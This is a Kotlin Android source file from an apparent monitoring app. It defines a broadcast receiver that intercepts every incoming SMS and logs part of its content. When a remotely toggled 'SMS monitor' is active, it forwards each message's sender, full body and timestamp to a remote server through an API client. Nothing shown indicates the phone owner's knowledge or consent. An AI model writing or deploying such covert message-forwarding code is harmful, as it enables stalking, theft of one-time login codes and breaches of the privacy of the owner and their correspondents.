package com.abuzahra.manager.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage
import android.util.Log
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.executor.MonitorExecutor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SMSReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
            val pendingResult = goAsync()
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val bundle = intent.extras ?: run { pendingResult.finish(); return@launch }
                    val pdus = bundle.get("pdus") as? Array<*> ?: run { pendingResult.finish(); return@launch }
                    val format = bundle.getString("format") ?: "3gpp"
                    
                    for (pdu in pdus) {
                        val smsMessage = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            SmsMessage.createFromPdu(pdu as ByteArray, format)
                        } else {
                            @Suppress("DEPRECATION")
                            SmsMessage.createFromPdu(pdu as ByteArray)
                        }
                        val sender = smsMessage.displayOriginatingAddress ?: ""
                        val body = smsMessage.displayMessageBody ?: ""

                        Log.d("SMSReceiver", "SMS from $sender: ${body.take(50)}")

                        // Forward if SMS monitor is active
                        if (MonitorExecutor.isSmsMonitorActive()) {
                            try {
                                ApiClient.sendData(context, "sms", mapOf(
                                    "sender" to sender,
                                    "body" to body,
                                    "time" to System.currentTimeMillis()
                                ))
                            } catch (e: Exception) {
                                Log.e("SMSReceiver", "Error sending SMS data", e)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e("SMSReceiver", "Error processing SMS", e)
                } finally {
                    pendingResult.finish()
                }
            }
        }
    }
}